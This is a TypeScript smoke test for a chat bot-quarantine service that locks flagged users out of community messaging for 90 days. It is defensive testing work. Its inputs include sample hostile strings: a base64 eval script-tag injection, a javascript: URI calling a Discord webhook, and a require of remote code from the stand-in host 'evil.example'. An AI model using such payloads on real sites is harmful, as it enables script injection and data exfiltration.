/**
 * Smoke test for bot quarantine + 90-day community comms lock.
 * Run: npx tsx scripts/bot-quarantine.selftest.ts
 */
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';

const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'cp-bq-'));
process.chdir(tmp);

async function main() {
  const bq = await import('../src/server/botQuarantineService.ts');
  bq.__resetBotQuarantineStoreForTests();

  // Clean trading chat is allowed
  const clean = bq.screenCommunityMessage({
    uid: 'user_clean',
    handle: 'Trader_1',
    text: 'Watching EURUSD liquidity sweep into London open',
    channel: 'forex-syndicate',
  });
  assert.equal(clean.allowed, true);

  // Bot payload → quarantine + lock
  const evil = bq.screenCommunityMessage({
    uid: 'user_bot',
    email: 'botter@example.com',
    handle: 'BotLoader',
    text: '<script>eval(atob("YWxlcnQoMSk="))</script> load bot mass dm via puppeteer',
    channel: 'lobby',
    ipAddress: '203.0.113.9',
  });
  assert.equal(evil.allowed, false);
  if (!evil.allowed) {
    assert.equal(evil.reason, 'bot_quarantined');
    assert.equal(evil.record.communityCommsLocked, true);
    assert.equal(evil.record.featuresAllowed, true);
    assert.ok(evil.record.quarantinedCode.includes('<script>'));
    assert.ok(evil.record.detectionSignals.includes('script_tag'));
    const expires = Date.parse(evil.record.expiresAt);
    const approx90d = Date.now() + bq.COMMUNITY_LOCK_DAYS * 24 * 60 * 60 * 1000;
    assert.ok(Math.abs(expires - approx90d) < 60_000);
  }

  // Already locked → still blocked even with clean text; features stay allowed
  const locked = bq.screenCommunityMessage({
    uid: 'user_bot',
    text: 'hello friends',
    channel: 'lobby',
  });
  assert.equal(locked.allowed, false);
  if (!locked.allowed) {
    assert.equal(locked.reason, 'community_locked');
    assert.equal(locked.record.featuresAllowed, true);
  }

  assert.equal(bq.isCommunityCommsLocked('user_bot'), true);
  assert.equal(bq.isCommunityCommsLocked('user_clean'), false);

  const status = bq.getPublicLockStatus('user_bot');
  assert.equal(status.locked, true);
  assert.equal(status.featuresAllowed, true);
  assert.ok((status.daysRemaining || 0) >= 89);

  // Manual quarantine
  const manual = bq.quarantineBotAttempt({
    uid: 'user_manual',
    reason: 'CEO manual quarantine',
    quarantinedCode: 'require("https://evil.example/bot.js")',
    source: 'manual',
    detectionSignals: ['manual'],
  });
  assert.equal(manual.source, 'manual');
  assert.equal(bq.isCommunityCommsLocked('user_manual'), true);

  const listed = bq.listQuarantines({ status: 'active' });
  assert.ok(listed.counts.active >= 2);

  const lifted = bq.liftQuarantine(manual.id, 'founder@test');
  assert.ok(lifted);
  assert.equal(lifted?.status, 'lifted');
  assert.equal(bq.isCommunityCommsLocked('user_manual'), false);

  // Guest identity fallback
  const guest = bq.screenCommunityMessage({
    handle: 'AnonSpammer',
    text: 'javascript:void(fetch("https://discord.com/api/webhooks/1/2"))',
    channel: 'lobby',
  });
  assert.equal(guest.allowed, false);
  if (!guest.allowed) {
    assert.equal(guest.uid, 'guest:anonspammer');
  }

  console.log('bot-quarantine.selftest: OK');
}

main().catch((err) => {
  console.error(err);
  process.exit(1);
});
